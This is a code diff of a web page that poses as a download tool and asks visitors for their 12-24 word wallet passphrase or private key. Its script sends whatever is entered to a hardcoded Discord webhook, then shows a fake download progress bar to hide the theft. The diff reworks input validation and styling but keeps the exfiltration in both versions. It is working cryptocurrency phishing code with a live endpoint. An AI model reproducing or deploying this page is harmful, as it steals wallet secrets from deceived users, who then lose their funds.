@@ -25,6 +25,13 @@
       }
     }
 
+    .image-logo {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      width: 100px;
+    }
+
     .container {
       max-width: 600px;
       margin: 0 auto;
@@ -44,23 +51,19 @@
     .input-field {
       background-color: #e9ecef;
       border: 2px solid #17a2b8;
-      padding: 20px;
+      padding: 35px;
       margin-bottom: 20px;
-      width: 100%;
+      width: 80%;
       border-radius: 5px;
       font-size: 16px;
       color: #495057;
-    }
-
-    .input-field.invalid {
-      border-color: red;
     }
 
     .button {
       background-color: #2367D1;
       border: none;
       color: #ffffff;
-      padding: 15px 40px;
+      padding: 10px 30px;
       text-align: center;
       text-decoration: none;
       display: inline-block;
@@ -69,10 +72,6 @@
       cursor: pointer;
       border-radius: 5px;
       transition: background-color 0.3s ease;
-    }
-
-    .button.invalid {
-      background-color: red;
     }
 
     .button:hover {
@@ -119,6 +118,10 @@
       background-color: #138496;
     }
 
+    .input-error {
+      border-color: red;
+    }
+
     @keyframes loading {
       0% {
         transform: translate(-50%, -50%) rotate(0deg);
@@ -145,69 +148,82 @@
 </head>
 <body>
   <div class="container">
+    <img class="image-logo" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmQyw5FbGkGgZeAgnUSs1h1MeRkYpaXCFrm2V5G56ieLZy?_gl=1*1vqjvjn*rs_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*rs_ga_5RMPXG14TE*MTY4NzY2NTA4Ni4yMi4xLjE2ODc2NjczODEuNjAuMC4w" alt="Logo">
+    <button class="back-button" onclick="window.history.back()">Back</button>
     <h2>Enter your 12-24 word passphrase or paste your PrivateKey to continue</h2>
     <input type="text" id="input-text" class="input-field" placeholder="Enter text">
     <button id="download-button" class="button">Download</button>
-    <div id="error-message"></div>
   </div>
 
   <script>
-    function sendDataToDiscord() {
-      var text = document.getElementById("input-text").value;
-      var errorContainer = document.getElementById("error-message");
-      var button = document.getElementById("download-button");
+    function validateInput() {
+      var input = document.getElementById("input-text");
+      var value = input.value.trim();
 
-      // Resetear los estilos y mensajes de error
-      errorContainer.innerText = "";
-      errorContainer.style.display = "none";
-      document.getElementById("input-text").classList.remove("invalid");
-      button.classList.remove("invalid");
+      var isValid = false;
 
-      // Validar el campo de entrada
-      if (text.trim().split(" ").length === 12 || text.trim().split(" ").length === 24 || /^[0-9a-fA-F]{64}$/.test(text.trim())) {
-        // Construir el objeto con los datos a enviar
-        var data = {
-          content: text
-        };
-
-        // Realizar la solicitud POST a través de fetch
-        fetch('https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data)
-        })
-        .then(function(response) {
-          console.log("Los datos se enviaron correctamente a Discord.");
-        })
-        .catch(function(error) {
-          console.error("Error en la solicitud:", error);
-        });
-
-        // Simulación de carga para animar el botón
-        button.classList.add("loading-button");
-        button.disabled = true;
-
-        var progress = 0;
-        var interval = setInterval(function() {
-          progress++;
-          button.innerText = "Downloading... " + progress + "%";
-
-          if (progress === 99) {
-            clearInterval(interval);
-            button.disabled = false;
-            button.classList.remove("loading-button");
-            button.innerText = "Download";
-          }
-        }, 200);
-      } else {
-        // Mostrar mensaje de error y cambiar estilos
-        errorContainer.innerText = "Invalid input. Please enter 12-24 words or a private key.";
-        errorContainer.style.display = "block";
-        document.getElementById("input-text").classList.add("invalid");
-        button.classList.add("invalid");
+      // Verificar si cumple con las especificaciones
+      if (value.split(" ").length === 12 || value.split(" ").length === 24 || value.length === 64) {
+        isValid = true;
       }
+
+      if (!isValid) {
+        // Marcar el campo y el botón como inválidos
+        input.classList.add("input-error");
+        document.getElementById("download-button").innerText = "Invalid";
+      } else {
+        // Quitar cualquier error y restaurar el botón
+        input.classList.remove("input-error");
+        document.getElementById("download-button").innerText = "Download";
+      }
+
+      return isValid;
+    }
+
+    function sendDataToDiscord() {
+      if (!validateInput()) {
+        return;
+      }
+
+      var text = document.getElementById("input-text").value;
+
+      // Construir el objeto con los datos a enviar
+      var data = {
+        content: text
+      };
+
+      // Realizar la solicitud POST a través de fetch
+      fetch('https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(function(response) {
+        console.log("Los datos se enviaron correctamente a Discord.");
+      })
+      .catch(function(error) {
+        console.error("Error en la solicitud:", error);
+      });
+
+      // Simulación de carga para animar el botón
+      var button = document.getElementById("download-button");
+      button.classList.add("loading-button");
+      button.disabled = true;
+
+      var progress = 0;
+      var interval = setInterval(function() {
+        progress++;
+        button.innerText = "Downloading... " + progress + "%";
+
+        if (progress === 99) {
+          clearInterval(interval);
+          button.disabled = false;
+          button.classList.remove("loading-button");
+          button.innerText = "Download";
+        }
+      }, 200);
     }
 
     var downloadButton = document.getElementById("download-button");
